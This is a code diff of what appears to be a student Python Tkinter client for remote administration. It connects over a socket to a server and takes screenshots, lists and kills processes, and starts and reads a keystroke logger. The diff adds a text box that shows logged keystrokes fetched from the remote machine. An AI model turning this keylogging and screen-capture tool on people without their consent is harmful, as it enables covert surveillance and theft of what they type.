@@ -16,6 +16,7 @@ root.title("Client")
 root.minsize(340, 250)
 connected = False
 check_see = False
+check_print = False
 myFont = font.Font(family="VnArial", size=9)
 
 
@@ -40,7 +41,7 @@ client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 def submitIP():
     host = entryIP.get()
-    port = 65432
+    port = 54321
     server_address = (host, port)
     global client
     try:
@@ -58,7 +59,7 @@ def submitIP():
 
 def takeScreenshotRequest():
 
-    def takeScreenFirst():  # lúc mở lên là chụp luôn, không cần update
+    def takeScreenFirst():  
         global client
         client.sendall(bytes("*snap*", "utf8"))
         data = client.recv(1024*1024)
@@ -67,19 +68,19 @@ def takeScreenshotRequest():
         f.write(image)
         f.close()
 
-    def takeScreen():  # các lần chụp sau, chụp xong update vô GUI
+    def takeScreen():  
         takeScreenFirst()
         resizedImg = resizeImg()
         lb.configure(image=resizedImg)
         lb.image = resizedImg
 
-    def saveImg():  # lưu hình, nếu không lưu thì tí nữa sẽ bị xóa khi đóng app
+    def saveImg():  
         filename = tkdilg.asksaveasfilename(defaultextension=".png", filetypes=(
             ("PNG file", "*.png"), ("All Files", "*.*")))
         if filename != "":
             shutil.move("snapshot.png", filename)
 
-    def resizeImg():  # scale hình cho vừa khung
+    def resizeImg():  
         img = Image.open('snapshot.png')
         newWidth = 360
         ratioScale = img.width/newWidth
@@ -144,7 +145,7 @@ def processRunningRequest():
                     Show_Error()
             else:
                 Show_Error()
-            # Dò id để kill
+            
         IDkill = tk.Text(killWindow, height=1, width=50, font=myFont)
         IDkill.grid(row=0, column=0, pady=10,
                     padx=(20, 20), sticky=tk.W+tk.S +
@@ -163,7 +164,7 @@ def processRunningRequest():
         i = 0
         client.sendall(bytes("see_process", "utf8"))
         data_see = client.recv(1024*1024).decode("utf8")
-        # print(data_see)
+        
         str_recv = data_see.split("_a_")
         for line in str_recv:
             i += 1
@@ -199,7 +200,7 @@ def processRunningRequest():
                 Show_Start_Process_Comp()
             else:
                 Show_Error()
-            # Dò id để kill
+            
         NameStart = tk.Text(startwindow, height=1, width=50, font=myFont)
         NameStart.grid(row=0, column=0, pady=10,
                        padx=(20, 20), sticky=tk.W+tk.S +
@@ -217,8 +218,7 @@ def processRunningRequest():
         createNewWindow(newWindow, "Process Running")
         newWindow.minsize(340, 360)
         global client
-        #data = client.recv(1024).decode("utf8")
-        # print(data)
+        
         killBtn = tk.Button(newWindow, height=3, width=10,
                             text="Kill", command=Kill)
         killBtn.grid(row=0, column=0, sticky=tk.W+tk.N +
@@ -252,8 +252,7 @@ def processRunningRequest():
         tree.heading("2", text="ID Application")
         tree.heading("3", text="Count Thread")
         newWindow.mainloop()
-        #filename = tkdilg.askopenfilename()
-        # print(filename)  # test
+        
     else:
         showConnectionError()
 
@@ -287,7 +286,7 @@ def appRunningRequest():
                     Show_Error()
             else:
                 Show_Error()
-            # Dò id để kill
+            
         IDkill = tk.Text(killWindow, height=1, width=50, font=myFont)
         IDkill.grid(row=0, column=0, pady=10,
                     padx=(20, 20), sticky=tk.W+tk.S +
@@ -306,7 +305,7 @@ def appRunningRequest():
         i = 0
         client.sendall(bytes("see_app", "utf8"))
         data_see = client.recv(1024*1024).decode("utf8")
-        # print(data_see)
+        
         str_recv = data_see.split("_a_")
         for line in str_recv:
             i += 1
@@ -359,8 +358,7 @@ def appRunningRequest():
         createNewWindow(newWindow, "App Running")
         newWindow.minsize(340, 360)
         global client
-        #data = client.recv(1024).decode("utf8")
-        # print(data)
+        
         killBtn = tk.Button(newWindow, height=3, width=10,
                             text="Kill", command=Kill)
         killBtn.grid(row=0, column=0, sticky=tk.W+tk.N +
@@ -450,16 +448,24 @@ def keystrokeRequest():
     def PrintKeyBoard():
         global unhooked
         global hooking
+        global check_print
+        if (check_print):
+            return
         if unhooked and not hooking:
             client.sendall(bytes("printkey", "utf8"))
             print("print")
-            # gửi request qua lấy nội dung trong file keylog về mà hiển thị vô cái ô ở dưới
-            # chỉ in được khi vừa unhook xong và không đang hooking
-            # 2 hàm trên đã test chạy ok, không thể lỗi được
-            # btw hàm start app vs process vẫn có vấn đề
-
+            content = client.recv(1024*1024).decode("utf8")
+            Text_box.configure(state="normal")
+            Text_box.insert(tk.END, content)
+            Text_box.configure(state="disabled")
+            
+        check_print = True
     def Del():
-        # tạo thêm cái ô ở dưới r gọi hàm xóa chữ thôi
+        global check_print
+        Text_box.configure(state="normal")
+        Text_box.delete("1.0","end")
+        Text_box.configure(state="disable")
+        check_print = False
         return
 
     if connected:
@@ -473,8 +479,7 @@ def keystrokeRequest():
         newWindow.minsize(340, 360)
         global client
         client.sendall(bytes("app running", "utf8"))
-        #data = client.recv(1024).decode("utf8")
-        # print(data)
+        
         HookBtn = tk.Button(newWindow, height=3, width=10,
                             text="Hook", command=Hook)
         HookBtn.grid(row=0, column=0, sticky=tk.W+tk.N +
@@ -491,6 +496,9 @@ def keystrokeRequest():
                            text="Xóa", command=Del)
         DelBtn.grid(row=0, column=3, sticky=tk.W+tk.N +
                     tk.S+tk.E, pady=20, padx=(0, 20))
+        Text_box = tk.Text(newWindow,height=12,width=41)
+        Text_box.place(x=20,y=107)
+        Text_box.configure(state="disabled")
         newWindow.mainloop()
     else:
         showConnectionError()
